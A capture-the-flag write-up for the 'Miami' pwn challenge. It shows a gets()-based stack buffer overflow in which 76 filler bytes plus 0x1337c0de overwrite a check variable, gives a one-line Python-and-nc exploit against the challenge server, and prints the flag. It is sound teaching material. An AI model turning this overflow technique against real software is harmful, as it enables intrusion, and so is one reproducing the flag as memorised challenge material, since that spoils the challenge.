Miami

**Author:** Oreomeister

**Description:**  
Dexter is the prime suspect of being the Bay Harbor Butcher, we break into his login terminal and get the proof we need!

**Challenge server:**  
`nc chal.sunshinectf.games 25601`

---

# Miami — Writeup

**Category:** pwn / binary exploitation

## Challenge Summary

Dexter is suspected to be the Bay Harbor Butcher. The binary `miami` asks for "Dexter's password"; with a wrong password it prints `Invalid credentials!`, but if we manage to control an internal variable the program prints `Access granted...` and reveals the proof/flag. The binary is a 64-bit PIE ELF and contains a vulnerable `vuln()` function using `gets()`.

---

## Reconnaissance

Run some basic commands to learn about the target:

```bash
file miami
# ELF 64-bit LSB PIE executable, x86-64, dynamically linked

strings ./miami
# shows functions: gets, puts, fopen, fread, read_flag, and a reference to flag.txt
```

The presence of `gets` in the strings strongly suggests a classic stack-based buffer overflow vulnerability.

---

## Static Analysis (i used ghidra)

Decompiled function `vuln()`:

```c
void vuln(void)
{
    char local_58[76];
    int local_c;

    local_c = -0x21524111;
    memset(local_58, 0, sizeof(local_58));

    printf("Enter Dexter's password: ");
    gets(local_58);

    if (local_c == 0x1337c0de) {
        puts("Access granted...");
        read_flag();
    } else {
        puts("Invalid credentials!");
    }
    return;
}
```

**Key observations:**

- `local_58` is a 76-byte buffer on the stack.  
- `local_c` is a 4-byte integer located immediately after `local_58`.  
- `gets(local_58)` allows reading input without length checks → classic stack buffer overflow.  
- If `local_c == 0x1337c0de`, the program prints `Access granted...` and calls `read_flag()`.

On x86_64, integers are 4 bytes, little-endian. Thus `0x1337c0de` in memory is:

```
\xde\xc0\x37\x13
```

---

## Exploitation Plan

1. Fill the buffer with exactly 76 bytes to reach `local_c`.  
2. Overwrite `local_c` with `0x1337c0de` (little-endian).  
3. Send a newline to terminate input.  
4. Program prints `Access granted...` and reveals the flag.

**Payload layout:**

```
[A x 76] + [\xde\xc0\x37\x13] + [\n]
```

---

## One-line Exploit (Remote with nc)

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xde\xc0\x37\x13" + b"\n")' | nc chal.sunshinectf.games 25601
```

**Expected output:**

```
Enter Dexter's password: Access granted...
sun{DeXtEr_was_!nnocent_Do4kEs_w4s_the_bAy_hRrb0ur_bu7cher_afterall!!}
```
